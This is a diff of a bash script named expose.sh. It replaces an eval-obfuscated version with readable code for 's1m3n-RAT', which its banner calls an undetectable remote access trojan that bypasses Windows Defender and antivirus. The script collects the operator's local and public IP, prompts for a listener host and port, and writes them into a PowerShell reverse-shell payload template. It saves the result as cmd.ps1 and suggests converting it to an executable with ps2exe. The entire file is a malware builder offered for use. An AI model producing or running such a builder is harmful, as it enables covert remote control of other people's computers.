@@ -1,3 +1,146 @@
-z="
-";ADz='Shel';kGz=' WAN';xGz='☢" -';ABz=' ban';GMz='pe';DJz=' cmd';IEz='ge: ';WBz=' |__';qz='221m';fKz='ED}"';iFz=' ${G';gJz='l_c ';bBz='\   ';aHz='l)';kz='YELL';lCz='Of A';RLz=' $se';jCz='l Ki';OHz='try-';qHz=' /de';yBz='> > ';jFz='REEN';sDz=' ] T';Yz=';38;';HEz=' Usa';TLz=' -eq';kIz='payl';CLz='WAN"';lIz='oads';VGz='I`';IKz='aned';dFz='1';Pz='ORAN';bEz='cies';YDz='${CN';hFz='" ];';aKz=' :)"';mLz='ully';SEz='slee';pFz='d ]"';QGz=' "';KGz='] Do';GDz='${BL';dIz='Unde';SCz='e RA';pDz='en';tBz='_) |';pGz='T=$(';BKz='-f c';vIz='" | ';WLz='hen';CFz='Inte';ZIz='{CNC';aGz='ort ';jDz='if [';MDz='.com';bLz='ct -';bFz='null';LJz='at/c';JLz='{YEL';Ez=''\''\03';PEz='fi';FFz='.${R';Kz='N='\''\';qDz='D}"\';XEz='heck';lBz=' |_)';jEz='g -c';Bz='\033';YIz=':)\n';TFz='...$';LEz='xpos';EEz='&2';PGz='..\n';RBz=' ___';mGz='bann';SHz=' --e';lJz='*] (';PFz='[ ✔ ';HFz=' Not';HBz='####';KIz='{RED';FDz='stem';vKz='C}[$';yz='tion';ULz=' 1  ';iDz='}';cHz='T LP';jLz='[*] ';gCz='ell ';BCz='/|_|';hLz='()';TEz='p 1';QLz='ect';nBz='\ | ';DGz='\n"';oEz='grep';qCz='LLOW';qIz='s/{l';iBz='_ \|';BIz='ST//';EMz='atta';rLz='ows:';VDz=': Ma';NCz='   A';MEz='e.sh';THz='ntry';ZHz='/nul';PJz='] Ti';fBz='| |\';SFz='et..';aEz='nden';oIz='.ps1';wBz=' \| ';uDz='scri';mKz='e Ne';AEz='s ro';qFz='p 2';Jz='GREE';RHz='ddr"';WHz=' 310';QIz='ol O';RDz='${PI';DIz=' | s';CJz='" >>';Cz='[0m'\''';rJz=' Try';hKz='] Us';tz='CN='\''';mz='214m';GGz=' ins';nLz=' Und';JGz='-y';vEz=' ]];';EKz='then';YCz='10 D';XJz='rmat';RFz='tern';oJz=' ) D';pHz='0 2>';BFz='X ] ';UJz='s1 t';wJz='topp';wHz='ntf ';nCz='otec';SLz='lect';uHz='ny=$';FLz='"3"$';tJz='xit.';KFz=' ]"';NFz='EEN}';fCz='As W';ZBz=' |  ';VJz='o ex';rCz='   N';RGz='addr';eHz='t "e';wGz='OST ';rGz='ty -';NJz='s1 \';OEz=' 1';tKz=' )\n';mHz='y --';Uz=''\''';LDz='book';CBz='){';SGz='=`ho';Sz='8;5;';yLz=' cho';rFz=' ] Z';xz='func';eFz=' "$?';eLz='LAN';KHz=': $p';LBz='    ';BHz='our-';TIz='Educ';kJz=' {';ACz='| ||';yGz='-tex';XIz='ose ';DKz=']]; ';lFz='] Ze';eIz='ctab';hJz='INT';QFz='] In';uBz=' |\ ';MGz='nsta';FBz='${RE';uKz='"${N';CKz='s1  ';FGz='-get';mFz='..${';aFz='dev/';oGz='LHOS';OJz='n "';rBz='___)';sLz='CHOO';YHz='/dev';bz='2='\''\';Zz='5;01';xLz=':"';dKz='ype(';TCz='T th';WEz='*] C';HCz='_\/_';eBz=' _\ ';MJz='md.p';cGz='.ope';uFz='.[ N';mEz='e.co';gBz='\| |';FCz='_| \';pCz='${YE';lz='OW='\''';cDz='://g';UCz='at B';JKz='"   ';UFz='{GRE';pLz='ble ';NKz='rm  ';nHz='widt';JHz='c-ip';LIz='[+] ';eDz='b.co';BMz=' $ch';LCz='  /_';BBz='ner(';UDz='d By';oKz='k Or';HLz=' -n ';TKz=' Usi';FIz='-e '\''';vHz='(pri';UKz='ng U';vFz='ot F';xCz='pen ';wDz='ust ';EIz='ed  ';iz='NEW=';JEz='sudo';vz='CNC=';gKz='\n[*';gEz='n"';qKz='ide ';tEz=')" !';XHz=' 2> ';iCz='s Al';fFz='" -e';DDz='acke';hBz='\  |';UHz=' --w';ICz='/   ';uJz='.. "';MHz='dr" ';sEz='ss'\'' ';bJz='e to';gHz='le: ';oHz='h 31';xJz='Serv';SJz='onve';nJz=' + C';EDz='r Sy';NBz='____';JFz='king';Iz='m'\''';WDz='chin';REz='r';YBz=' \ |';kLz='Crea';lKz='tsid';KDz='face';yEz='D} "';ODz='nown';XLz='WAN';iEz='(pin';QKz='] Th';jGz='com`';MFz='${GR';Tz='202m';qBz=' <  ';KLz='LOW}';dEz='figu';yHz='X'\'' $';Fz='3[1;';GBz='D}"#';ALz=']${C';kCz='nds ';sIz='}/$i';rIz='host';tCz=' Thi';KBz='}"  ';qEz='0% p';uLz='TTAC';kBz='___|';UGz='me -';gDz='e133';jKz='N Fo';KJz='in-r';VIz='nal ';nEz='m | ';MLz='elec';HKz=' cle';fIz='le P';wz=';051';ez='3m'\''';IMz='se -';XKz='E s1';aBz='   |';YKz='m3n-';WIz='Purp';pIz='ed "';QHz=' "$a';OIz=' Use';VLz=']; t';fLz='eq 3';PDz='clay';YLz='elif';oDz='; th';uGz='☢ SE';cBz=' / \';ZKz='RAT ';YFz='nity';fHz='xamp';dDz='ithu';TGz='stna';gFz='q "0';IBz='"';NHz='--en';kKz='r Ou';pEz=' '\''10';iKz='e WA';oFz='foun';CCz='_| |';vDz='pt m';NDz='/unk';XDz='e404';xDz='be r';tIz='pcon';ZEz='depe';AJz='t}/$';dHz='ORT ';cJz='ol"';xBz='|   ';EJz='{CP}';eCz='#"';cIz='our ';wCz='ll O';IIz=')';dGz='ndns';cz='32m'\''';lLz='te F';DLz='"2"$';GKz='eady';ZGz=' +sh';Nz=';5;0';VEz='} "[';YGz='`dig';IFz=' wor';fJz=' ctr';RKz='anks';FKz=' "al';aCz='der ';WFz='whic';gIz='aylo';ZFz=' > /';sJz='To E';GIz='s/^/';aDz='   h';XBz='_ /|';dCz='on  ';sFz='enit';IJz='ed a';LLz='+] S';fz='GRAY';iJz='ctrl';UIz='atio';cKz='ackt';PKz='}"[*';HJz=' sav';bCz='Prot';QBz='_   ';vCz='T Wi';BJz='T/gi';Vz='BLUE';rz='CPO=';jHz='entr';BLz='NC} ';NEz='exit';QEz='clea';tGz='le="';lGz='(){';CGz='ity ';XFz='h ze';iLz='{';jIz='cat ';wKz='{CG}';wIz='sed ';sBz=' | |';XGz='ddr=';VKz='NDEC';DCz='_|__';KEz=' ./e';gGz='er1.';yKz='{NC}';oz='087m';kDz='[ $E';TBz=' / /';wFz='ound';hHz='2222';gz='5;00';SKz=' For';uCz='s RA';FHz='ddr ';DBz='echo';IHz='ubli';vBz='<  /';HHz='ur-P';lEz='oogl';Wz='='\''\0';NLz='t: "';mCz='V Pr';Lz='033[';xKz='"1"$';bKz=' att';MKz='>&1';SBz='   #';SDz='NK}"';CMz='oose';AGz='ling';JCz='\_\_';VFz='EN}[';cCz='ecti';fEz='on \';BDz='l In';MIz='Warn';NIz='ing!';AKz='... ';QJz='p: N';sz=';205';GLz='EXIT';HMz='choo';sHz='ll)';cEz=' con';hEz='[ "$';Hz=';196';IDz='http';qGz='zeni';bIz='ng Y';uIz='y/gi';PCz='ly U';HDz='UE}"';PHz='text';GFz='ED}[';uEz='= ""';GCz='_|  ';OGz='g ..';OBz='  _ ';ILz='-e $';bGz='myip';jz=';154';jJz='_c()';UBz='|/ |';AHz='t "Y';pKz=' Ins';pz='CP='\''';nKz='twor';vLz='K_TY';nGz='er';JBz='${CP';iIz=')\n"';hz='4m'\''';kHz='y-te';nz='CG='\''';vJz='*] S';gLz='menu';xIz='"s/{';lHz='xt "';LHz='ubad';YEz='ing ';PLz=' sel';yDz='un a';ZDz='C}" ';xHz=''\''%02';XCz='ndow';EGz=' apt';oBz='|  |';dJz=' LAN';tFz='y...';Oz='40m'\''';GHz='; Yo';pJz='etec';xFz='[ ! ';xEz='n';JDz='s://';CHz='Loca';Az='NC='\''';bDz='ttps';NGz='llin';rDz='n[ X';ZJz='ng p';qLz='Wind';wEz=' the';HGz='tall';JJz='s /w';lDz='UID ';rHz='v/nu';MBz='  __';uz='247m';mJz='Ctrl';mIz='/pay';LFz='else';WCz='s Wi';mDz='-ne ';EFz='....';RJz='ow C';RCz='tabl';fGz='solv';ZLz=' [ $';vGz='T LH';tLz='SE A';FMz='ckty';sGz='-tit';DHz='l-ip';DMz=' 1 ]';dz='PINK';WKz='TABL';EHz=': $a';iHz='" --';kFz='}"\n';Rz='[1;3';ZCz='efen';yIz='lpor';pBz='   <';kEz=' 1 g';HIz='0x/'\''';nFz='N}[ ';eGz=' @re';UEz='${NC';nDz='0 ]]';fDz='m/ma';Xz='33[1';eJz='trap';dLz=' ]; ';rEz='t lo';KKz='>/de';hGz='open';eEz='rati';jBz='  \|';JIz='-n $';nIz='load';Qz='GE='\''';aLz='sele';yCz='CMD ';sCz='ote:';KCz=' \_\';hIz='ad :';yJz='ices';OFz=' "\n';iGz='dns.';DEz='" 1>';dBz='|_  ';oLz='ecta';Dz='RED=';TDz='Code';GJz=' Pay';az='2m'\''';VHz='idth';aIz='Gene';QDz=' #"';rKz='Netw';AFz='\n[ ';qJz='ted,';tHz='ipco';QCz='ndec';ECz='__/|';WGz='puba';CEz=') \n';WJz='e fo';hCz='As B';oCz='s   ';FJz='"\n[';GEz=' ✔ ]';DFz='rnet';LGz='ne i';CDz=' Att';YJz=' usi';TJz='rt c';tDz='his ';VCz='ypas';AMz='ose';RIz='nly ';mBz='/ _ ';wLz='PE:"';MCz='D}" ';ELz='LAN"';EBz=' -e ';yFz='stal';OKz=' ""';OCz=' Ful';cLz='eq 2';PBz='___ ';PIz='s To';sKz='ork:';hDz='7   ';aJz='s2ex';cFz=' 2>&';Mz='1;38';Gz='38;5';eKz=' ${R';OLz='read';bHz='LPOR';SIz='For ';BGz=' Zen';BEz='ot :';AIz='{LHO';FEz='D}"[';CIz='./ }';IGz=' zen';LKz='ll 2';VBz='_ __';
-eval "$Az$Bz$Cz$z$Dz$Ez$Fz$Gz$Hz$Iz$z$Jz$Kz$Lz$Mz$Nz$Oz$z$Pz$Qz$Bz$Rz$Sz$Tz$Uz$z$Vz$Wz$Xz$Yz$Zz$az$z$Vz$bz$Lz$Mz$Nz$cz$z$dz$Wz$Xz$Yz$Zz$ez$z$fz$Wz$Xz$Yz$gz$hz$z$iz$Ez$Fz$Gz$jz$Iz$z$kz$lz$Bz$Rz$Sz$mz$Uz$z$nz$Bz$Rz$Sz$oz$Uz$z$pz$Bz$Rz$Sz$qz$Uz$z$rz$Ez$Fz$Gz$sz$Iz$z$tz$Bz$Rz$Sz$uz$Uz$z$vz$Ez$Fz$Gz$wz$Iz$z$xz$yz$ABz$BBz$CBz$z$DBz$EBz$FBz$GBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$IBz$z$DBz$EBz$JBz$KBz$LBz$MBz$NBz$OBz$LBz$LBz$MBz$PBz$QBz$QBz$LBz$NBz$LBz$OBz$RBz$NBz$LBz$LBz$SBz$IBz$z$DBz$EBz$JBz$KBz$LBz$TBz$RBz$UBz$VBz$RBz$WBz$XBz$YBz$ZBz$aBz$OBz$bBz$cBz$dBz$eBz$bBz$LBz$SBz$IBz$z$DBz$EBz$JBz$KBz$LBz$fBz$PBz$gBz$OBz$OBz$hBz$iBz$jBz$WBz$kBz$lBz$ZBz$mBz$nBz$oBz$ZBz$LBz$SBz$IBz$z$DBz$EBz$JBz$KBz$pBz$qBz$rBz$sBz$sBz$sBz$WBz$tBz$uBz$WBz$kBz$OBz$vBz$RBz$wBz$xBz$yBz$LBz$SBz$IBz$z$DBz$EBz$JBz$KBz$LBz$ACz$NBz$BCz$CCz$CCz$DCz$ECz$FCz$GCz$aBz$FCz$HCz$ICz$JCz$oBz$ZBz$LBz$SBz$IBz$z$DBz$EBz$JBz$KBz$LBz$KCz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$LCz$ICz$LBz$SBz$IBz$z$DBz$EBz$FBz$MCz$LBz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz$XCz$YCz$ZCz$aCz$bCz$cCz$dCz$LBz$eCz$z$DBz$EBz$FBz$MCz$LBz$LBz$LBz$LBz$fCz$gCz$hCz$VCz$iCz$jCz$kCz$lCz$mCz$nCz$yz$oCz$LBz$LBz$LBz$eCz$z$DBz$EBz$pCz$qCz$KBz$LBz$rCz$sCz$tCz$uCz$vCz$wCz$xCz$yCz$ADz$BDz$CDz$DDz$EDz$FDz$LBz$LBz$LBz$SBz$IBz$z$DBz$EBz$GDz$HDz$LBz$LBz$LBz$LBz$IDz$JDz$KDz$LDz$MDz$NDz$ODz$PDz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$QDz$z$DBz$EBz$RDz$SDz$LBz$LBz$LBz$LBz$LBz$TDz$UDz$VDz$WDz$XDz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$QDz$z$DBz$EBz$YDz$ZDz$LBz$LBz$LBz$aDz$bDz$cDz$dDz$eDz$fDz$WDz$gDz$hDz$LBz$LBz$LBz$LBz$LBz$LBz$LBz$eCz$z$DBz$EBz$FBz$GBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$HBz$IBz$z$iDz$z$jDz$kDz$lDz$mDz$nDz$oDz$pDz$z$DBz$EBz$FBz$qDz$rDz$sDz$tDz$uDz$vDz$wDz$xDz$yDz$AEz$BEz$CEz$DEz$EEz$z$DBz$EBz$FBz$FEz$GEz$HEz$IEz$JEz$KEz$LEz$MEz$IBz$z$NEz$OEz$z$PEz$z$QEz$REz$z$SEz$TEz$z$DBz$EBz$UEz$VEz$WEz$XEz$YEz$ZEz$aEz$bEz$cEz$dEz$eEz$fEz$gEz$z$jDz$hEz$iEz$jEz$kEz$lEz$mEz$nEz$oEz$pEz$qEz$DDz$rEz$sEz$tEz$uEz$vEz$wEz$xEz$z$DBz$EBz$FBz$yEz$AFz$BFz$CFz$DFz$EFz$EFz$EFz$FFz$GFz$HFz$IFz$JFz$KFz$z$NEz$OEz$z$LFz$z$DBz$EBz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$EFz$EFz$TFz$UFz$VFz$IFz$JFz$KFz$z$PEz$z$SEz$TEz$z$WFz$XFz$YFz$ZFz$aFz$bFz$cFz$dFz$z$jDz$eFz$fFz$gFz$hFz$wEz$xEz$z$DBz$EBz$iFz$jFz$kFz$PFz$lFz$YFz$EFz$EFz$EFz$EFz$mFz$Jz$nFz$oFz$pFz$z$WFz$XFz$YFz$ZFz$aFz$bFz$cFz$dFz$z$SEz$qFz$z$LFz$z$DBz$EBz$FBz$qDz$rDz$rFz$sFz$tFz$EFz$EFz$EFz$uFz$vFz$wFz$KFz$z$SEz$TEz$z$DBz$EBz$pCz$qCz$kFz$xFz$QFz$yFz$AGz$BGz$CGz$DGz$z$SEz$TEz$z$JEz$EGz$FGz$GGz$HGz$IGz$CGz$JGz$z$QEz$REz$z$DBz$EBz$GDz$HDz$PFz$KGz$LGz$MGz$NGz$OGz$PGz$QGz$z$SEz$TEz$z$WFz$XFz$YFz$ZFz$aFz$bFz$cFz$dFz$z$PEz$z$RGz$SGz$TGz$UGz$VGz$z$WGz$XGz$YGz$ZGz$aGz$bGz$cGz$dGz$MDz$eGz$fGz$gGz$hGz$iGz$jGz$z$xz$yz$kGz$lGz$z$QEz$REz$z$mGz$nGz$z$oGz$pGz$qGz$rGz$sGz$tGz$uGz$vGz$wGz$xGz$yGz$AHz$BHz$CHz$DHz$EHz$FHz$GHz$HHz$IHz$JHz$KHz$LHz$MHz$NHz$OHz$PHz$QHz$RHz$SHz$THz$UHz$VHz$WHz$XHz$YHz$ZHz$aHz$z$bHz$pGz$qGz$rGz$sGz$tGz$uGz$cHz$dHz$xGz$yGz$eHz$fHz$gHz$hHz$iHz$jHz$kHz$lHz$hHz$iHz$jHz$mHz$nHz$oHz$pHz$qHz$rHz$sHz$z$tHz$uHz$vHz$wHz$xHz$yHz$AIz$BIz$CIz$DIz$EIz$FIz$GIz$HIz$IIz$z$SEz$qFz$z$DBz$EBz$JIz$KIz$kFz$LIz$MIz$NIz$OIz$tCz$PIz$QIz$RIz$SIz$TIz$UIz$VIz$WIz$XIz$YIz$IBz$z$SEz$qFz$z$DBz$EBz$JIz$ZIz$kFz$LIz$aIz$eEz$bIz$cIz$dIz$eIz$fIz$gIz$hIz$iIz$z$SEz$TEz$z$jIz$kIz$lIz$mIz$nIz$oIz$DIz$pIz$qIz$rIz$sIz$tIz$uIz$vIz$wIz$xIz$yIz$AJz$bHz$BJz$CJz$DJz$oIz$z$SEz$qFz$z$DBz$EBz$JIz$EJz$FJz$GEz$GJz$nIz$HJz$IJz$JJz$KJz$LJz$MJz$NJz$OJz$z$SEz$TEz$z$DBz$EBz$JIz$KIz$kFz$PFz$PJz$QJz$RJz$SJz$TJz$MJz$UJz$VJz$WJz$XJz$YJz$ZJz$aJz$bJz$cJz$z$iDz$z$xz$yz$dJz$lGz$z$QEz$REz$z$mGz$nGz$z$oGz$pGz$qGz$rGz$sGz$tGz$uGz$vGz$wGz$xGz$yGz$AHz$BHz$CHz$DHz$EHz$FHz$GHz$HHz$IHz$JHz$KHz$LHz$MHz$NHz$OHz$PHz$QHz$RHz$SHz$THz$UHz$VHz$WHz$XHz$YHz$ZHz$aHz$z$bHz$pGz$qGz$rGz$sGz$tGz$uGz$cHz$dHz$xGz$yGz$eHz$fHz$gHz$hHz$iHz$jHz$kHz$lHz$hHz$iHz$jHz$mHz$nHz$oHz$pHz$qHz$rHz$sHz$z$tHz$uHz$vHz$wHz$xHz$yHz$AIz$BIz$CIz$DIz$EIz$FIz$GIz$HIz$IIz$z$SEz$qFz$z$DBz$EBz$JIz$KIz$kFz$LIz$MIz$NIz$OIz$tCz$PIz$QIz$RIz$SIz$TIz$UIz$VIz$WIz$XIz$YIz$IBz$z$SEz$qFz$z$DBz$EBz$JIz$ZIz$kFz$LIz$aIz$eEz$bIz$cIz$dIz$eIz$fIz$gIz$hIz$iIz$z$SEz$TEz$z$jIz$kIz$lIz$mIz$nIz$oIz$DIz$pIz$qIz$rIz$sIz$tIz$uIz$vIz$wIz$xIz$yIz$AJz$bHz$BJz$CJz$DJz$oIz$z$SEz$qFz$z$DBz$EBz$JIz$EJz$FJz$GEz$GJz$nIz$HJz$IJz$JJz$KJz$LJz$MJz$NJz$OJz$z$SEz$TEz$z$DBz$EBz$JIz$KIz$kFz$PFz$PJz$QJz$RJz$SJz$TJz$MJz$UJz$VJz$WJz$XJz$YJz$ZJz$aJz$bJz$cJz$z$iDz$z$eJz$fJz$gJz$hJz$z$iJz$jJz$kJz$z$QEz$REz$z$DBz$EBz$FBz$FEz$lJz$mJz$nJz$oJz$pJz$qJz$rJz$YEz$sJz$tJz$uJz$z$DBz$EBz$FBz$FEz$vJz$wJz$YEz$xJz$yJz$AKz$IBz$z$jDz$xFz$BKz$MJz$CKz$DKz$EKz$z$DBz$FKz$GKz$HKz$IKz$JKz$KKz$rHz$LKz$MKz$z$LFz$z$NKz$DJz$oIz$z$PEz$z$SEz$TEz$z$DBz$OKz$z$DBz$EBz$pCz$qCz$PKz$QKz$RKz$SKz$TKz$UKz$VKz$WKz$XKz$YKz$ZKz$aKz$z$NEz$z$iDz$z$xz$yz$bKz$cKz$dKz$CBz$z$QEz$REz$z$mGz$nGz$z$DBz$EBz$eKz$fKz$gKz$hKz$iKz$jKz$kKz$lKz$mKz$nKz$oKz$dJz$SKz$pKz$qKz$rKz$sKz$tKz$IBz$z$DBz$EBz$uKz$vKz$wKz$xKz$yKz$ALz$BLz$CLz$z$DBz$EBz$uKz$vKz$wKz$DLz$yKz$ALz$BLz$ELz$z$DBz$EBz$uKz$vKz$wKz$FLz$yKz$ALz$BLz$GLz$IBz$z$DBz$HLz$ILz$JLz$KLz$FJz$LLz$MLz$NLz$z$OLz$PLz$QLz$z$jDz$RLz$SLz$TLz$ULz$VLz$WLz$z$XLz$z$YLz$ZLz$aLz$bLz$cLz$dLz$EKz$z$eLz$z$YLz$ZLz$aLz$bLz$fLz$dLz$EKz$z$NEz$z$PEz$z$iDz$z$gLz$hLz$z$iLz$z$QEz$REz$z$mGz$nGz$z$DBz$EBz$pCz$qCz$kFz$jLz$kLz$lLz$mLz$nLz$oLz$pLz$ZKz$SIz$qLz$rLz$DGz$z$DBz$EBz$uKz$vKz$wKz$xKz$yKz$ALz$BLz$sLz$tLz$uLz$vLz$wLz$z$DBz$EBz$uKz$vKz$wKz$DLz$yKz$ALz$BLz$GLz$xLz$z$DBz$HLz$ILz$JLz$KLz$FJz$LLz$MLz$NLz$z$OLz$yLz$AMz$z$jDz$BMz$CMz$TLz$DMz$oDz$pDz$z$EMz$FMz$GMz$z$YLz$ZLz$HMz$IMz$cLz$dLz$EKz$z$NEz$z$PEz$z$iDz$z$gLz"
+NC='\033[0m'
+RED='\033[1;38;5;196m'
+GREEN='\033[1;38;5;040m'
+ORANGE='\033[1;38;5;202m'
+BLUE='\033[1;38;5;012m'
+BLUE2='\033[1;38;5;032m'
+PINK='\033[1;38;5;013m'
+GRAY='\033[1;38;5;004m'
+NEW='\033[1;38;5;154m'
+YELLOW='\033[1;38;5;214m'
+CG='\033[1;38;5;087m'
+CP='\033[1;38;5;221m'
+CPO='\033[1;38;5;205m'
+CN='\033[1;38;5;247m'
+CNC='\033[1;38;5;051m'
+function banner(){
+echo -e ${RED}"#############################################################################"
+echo -e ${CP}"        ______  _           _____ _   _       ____      _  _______           #"
+echo -e ${CP}"       / / ___|/ |_ __ ___ |___ /| \ | |     |  _ \    / \|_   _\ \          #"
+echo -e ${CP}"      | |\___ \| |  _   _ \  |_ \|  \| |_____| |_) |  / _ \ | |  | |         #"
+echo -e ${CP}"     < <  ___) | | | | | | |___) | |\  |_____|  _ <  / ___ \| |   > >        #"
+echo -e ${CP}"      | ||____/|_|_| |_| |_|____/|_| \_|     |_| \_\/_/   \_\_|  | |         #"
+echo -e ${CP}"       \_\                                                      /_/          #"
+echo -e ${RED}"        A Fully Undectable RAT that Bypass Window10 Defender Protection      #"
+echo -e ${RED}"                 As Well As Bypass All Kinds Of AV Protections               #"
+echo -e ${YELLOW}"         Note: This RAT Will Open CMD Shell In Attacker System               #"
+echo -e ${BLUE}"                https://facebook.com/unknownclay                             #"
+echo -e ${PINK}"                    Coded By: Machine404                                     #"
+echo -e ${CNC}"                https://github.com/machine1337                               #"
+echo -e ${RED}"#############################################################################"
+}
+if [[ $EUID -ne 0 ]]; then
+echo -e ${RED}"\n[ X ] This script must be run as root :) \n" 1>&2
+echo -e ${RED}"[ ✔ ] Usage: sudo ./expose.sh"
+exit 1
+fi
+clear
+sleep 1
+echo -e ${NC} "[*] Checking dependencies configuration \n"
+if [[ "$(ping -c 1 google.com | grep '100% packet loss' )" != "" ]]; then
+echo -e ${RED} "\n[ X ] Internet.............${RED}[ Not working ]"
+exit 1
+else
+echo -e ${GREEN} "\n[ ✔ ] Internet.............${GREEN}[ working ]"
+fi
+sleep 1
+which zenity > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e  ${GREEN}"\n[ ✔ ] Zenity..................${GREEN}[ found ]"
+which zenity > /dev/null 2>&1
+sleep 2
+else
+echo -e ${RED}"\n[ X ] Zenity................[ Not Found ]"
+sleep 1
+echo -e ${YELLOW}"\n[ ! ] Installing Zenity \n"
+sleep 1
+sudo apt-get install zenity -y
+clear
+echo -e ${BLUE}"[ ✔ ] Done installing ....\n "
+sleep 1
+which zenity > /dev/null 2>&1
+fi
+addr=`hostname -I`
+pubaddr=`dig +short myip.opendns.com @resolver1.opendns.com`
+function WAN(){
+clear
+banner
+LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $addr ; Your-Public-ip: $pubaddr" --entry-text "$addr" --entry --width 310 2> /dev/null)
+LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 2222" --entry-text "2222" --entry --width 310 2> /dev/null)
+ipcony=$(printf '%02X' ${LHOST//./ } | sed  -e 's/^/0x/')
+sleep 2
+echo -e -n ${RED}"\n[+] Warning! Use This Tool Only For Educational Purpose :)\n"
+sleep 2
+echo -e -n ${CNC}"\n[+] Generating Your Undectable Payload :)\n"
+sleep 1
+cat payloads/payload.ps1 | sed "s/{lhost}/$ipcony/gi" | sed "s/{lport}/$LPORT/gi" >> cmd.ps1
+sleep 2
+echo -e -n ${CP}"\n[ ✔ ] Payload saved as /win-rat/cmd.ps1 \n "
+sleep 1
+echo -e -n ${RED}"\n[ ✔ ] Tip: Now Convert cmd.ps1 to exe format using ps2exe tool"
+}
+function LAN(){
+clear
+banner
+LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $addr ; Your-Public-ip: $pubaddr" --entry-text "$addr" --entry --width 310 2> /dev/null)
+LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 2222" --entry-text "2222" --entry --width 310 2> /dev/null)
+ipcony=$(printf '%02X' ${LHOST//./ } | sed  -e 's/^/0x/')
+sleep 2
+echo -e -n ${RED}"\n[+] Warning! Use This Tool Only For Educational Purpose :)\n"
+sleep 2
+echo -e -n ${CNC}"\n[+] Generating Your Undectable Payload :)\n"
+sleep 1
+cat payloads/payload.ps1 | sed "s/{lhost}/$ipcony/gi" | sed "s/{lport}/$LPORT/gi" >> cmd.ps1
+sleep 2
+echo -e -n ${CP}"\n[ ✔ ] Payload saved as /win-rat/cmd.ps1 \n "
+sleep 1
+echo -e -n ${RED}"\n[ ✔ ] Tip: Now Convert cmd.ps1 to exe format using ps2exe tool"
+}
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e ${RED}"[*] (Ctrl + C ) Detected, Trying To Exit... "
+echo -e ${RED}"[*] Stopping Services... "
+if [[ ! -f cmd.ps1  ]]; then
+echo "aleady cleaned"   >/dev/null 2>&1
+else
+rm   cmd.ps1
+fi
+sleep 1
+echo ""
+echo -e ${YELLOW}"[*] Thanks For Using UNDECTABLE s1m3n-RAT  :)"
+exit
+}
+function attacktype(){
+clear
+banner
+echo -e  ${RED}"\n[*] Use WAN For Outside Network Or LAN For Inside Network: )\n"
+echo -e "${NC}[${CG}"1"${NC}]${CNC} WAN"
+echo -e "${NC}[${CG}"2"${NC}]${CNC} LAN"
+echo -e "${NC}[${CG}"3"${NC}]${CNC} EXIT"
+echo -n -e ${YELLOW}"\n[+] Select: "
+read select
+if [ $select -eq 1  ]; then
+WAN
+elif [ $select -eq 2 ]; then
+LAN
+elif [ $select -eq 3 ]; then
+exit
+fi
+}
+menu()
+{
+clear
+banner
+echo -e ${YELLOW}"\n[*] Create Fully Undectable RAT For Windows:\n"
+echo -e "${NC}[${CG}"1"${NC}]${CNC} CHOOSE ATTACK_TYPE:"
+echo -e "${NC}[${CG}"2"${NC}]${CNC} EXIT:"
+echo -n -e ${YELLOW}"\n[+] Select: "
+read choose
+if [ $choose -eq 1 ]; then
+attacktype
+elif [ $choose -eq 2 ]; then
+exit
+fi
+}
+menu
